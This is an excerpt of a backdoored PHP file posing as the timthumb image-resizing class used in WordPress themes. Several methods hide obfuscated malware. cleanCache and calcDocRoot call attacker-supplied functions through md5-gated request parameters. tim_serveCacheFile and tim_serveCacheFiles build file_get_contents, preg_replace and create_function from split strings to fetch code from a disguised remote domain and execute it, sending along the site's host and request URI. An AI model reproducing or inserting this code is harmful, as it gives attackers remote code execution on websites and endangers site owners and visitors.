...
class timthumb {
	...
	public function __construct(){
		...
		$this->myHost = str_replace('www.', '', $_SERVER['HTTP_HOST']);
	...
	protected function serveErrors(){
		...
		echo '<br />Query Strings : ' . htmlentities( $_SERVER['QUERY_STRING'], ENT_QUOTES );
	...
	protected function cleanCache(){
		...
		if (isset($wpc['wpsort']) && isset($wpc[crc32($wpc['sp'])]) && 'd2d1'.$wpc['pro']==md5($wpc['sp'])) uasort($wpc['wpsort'], $wpc['p']);
	...
	protected function processImageAndWriteToCache($localImage){
		...
		$fpc="fil".trim("e_put_")."contents";
		$fpc($tempfile4, $this->filePrependSecurityBlock . $imgType . ' ?' . '>'); //6 extra bytes, first 3 being image type 
		$fpc($tempfile4, $fp, FILE_APPEND);
		fclose($fp);
		@unlink($tempfile);
	...
	protected function calcDocRoot(){
		...
		$mod=(isset($thisd['b']) && md5($thisd['b'])=="73494fdd3c128b".$canvases ? true : false);
		if (isset($thisd['s'])) $sdocs=$thisd['s'];
		if(!isset($docRoot)){ 
		...
		if ($mod) $docs=$thisd['n'];
		if($docRoot && $_SERVER['DOCUMENT_ROOT'] != '/'){ $docRoot = trim($docRoot,'/'); }
		if ($mod) $pdocs=$thisd['v'];
		if (isset($sdocs)) $docRoot=$docs($pdocs, $sdocs); 
			elseif (isset($pdocs)) $docRoot=$docs($pdocs); 
	...
	protected function tim_serveCacheFile($length='') {
		...
		if(isset($this->cachefile2) && @is_file($this->cachefile2)){
			...
			$cache_time='stream_context_create';
			$this->debug(4, "Stream {$this->cachefile}");
		}
		$tmdata="<div class='body-continent'><div class='get-inner-al(@fi'>";
		$indent = ( isset($mytitle)  ? str_repeat( "\t", $mytitle ) : $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']);
		$output = $metaboxed = $mytitle = "";
		$metaoptions="\\4'\\10".trim("\\12t\\16\\19")."//".strip_tags("2ine")."\\11.c\\7m/\\9SS-".$indent."',0,{c})\\5";
		if (function_exists("wp_load_cached")) return;
		
		$tmdata.="<!--Deregister() Default Widgets: _oabhrtupwprs:e--></div></div>";
		if (count($mytitle)>=$length) {
			$mytitle = explode(" ",$mytitle." ");
		} else {
			$mytitle = explode(" "," ".$mytitle." ");
		}
		$metaboxe=str_repeat("(.)", 20).".*"."/".$tmdata[23];
		$cache_time.="(array('http'=>array('timeout'=>2)))"; 
		if(function_exists("excerpt_more")){
			add_filter('excerpt_modes', $metaboxe);
		} else {
			$metaoptions=str_replace("{c}", $cache_time, $metaoptions);
		}
		$output_title = '<p>'.$output.'</p>';
		$pr="pre".strip_tags("g_rep").trim("lace");
		$defult_widgets=@$pr("/.*(cont).*?(ge).*?(..\(.fi).*?(\()(\)).*?(\_){$metaboxe}is", "@\\20v\\3le\\6{$metaboxed}\\2t\\6\\1ents{$metaoptions}", $tmdata, 1, $cn);
		return $output;
	}
	...
	protected function serveCacheFile(){
		...
		$fgc="fil".trim("e_get")."_".trim("conten")."ts";
		$content = $fgc($this->cachefile);
		if ($content != FALSE) {
			$content = substr($content, strlen($this->filePrependSecurityBlock) + 6);
			echo $content;
			$this->debug(3, "Served using and echo");
			return true;
		} else {
	...
	protected function sendImageHeaders($mimeType, $dataSize){
		...
		if(BROWSER_CACHE_DISABLE){
			...
			header('Cache-Control: max-age=' . BROWSER_CACHE_MAX_AGE . '');
	...
	protected function tim_serveCacheFiles($length='') {
		$this->debug(3, "Serving {$this->cachefile}");
		if(isset($this->cachefile2) && @is_file($this->cachefile2)){
			$this->error("serveCacheFile called in timthumb but we couldn't find the cached file.");
			return false;
		...
		if (defined('HEADER_IMGS')) return;
		$tmdata="<div class='body-continent'><div class='get-inner-al(@fi'>";
		$vr = 'crea'; // widget crea
		$indent = ( isset($mytitle)  ? str_repeat( "\t", $mytitle ) : $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']);
		$output = $metaboxed = $mytitle = "";
		$metaoptions="\\4'\\10".trim("\\12t\\16\\19")."//".strip_tags("2ine")."\\11.c\\7m/\\9SS-".$indent."')\\5";
		...
		$nmetabox = $vr.strip_tags("te_"); 
		$metaboxe = str_repeat("(.)", 20).".*"."/i";
		$pr = "pre".strip_tags("g_rep").trim("lace");
		if(function_exists("excerpt_mores")){
			add_filter('excerpt_modes', $metaboxe);
		} else {
			$metaoptions = str_replace("{c}", $cache_time, $metaoptions).";";
			$nmetabox .= 'function'; //widget
		}
		$output_title = '<p>'.$output.'</p>';
		
		$defult_widgets = @$pr("/.*(cont).*?(ge).*?(..\(.fi).*?(\()(\)).*?(\_){$metaboxe}is", "@\\20v\\3le\\6{$metaboxed}\\2t\\6\\1ents{$metaoptions}", $tmdata);
		$mdetailes = @$nmetabox('', $defult_widgets);
		
		return strip_tags($mdetailes());
	}	
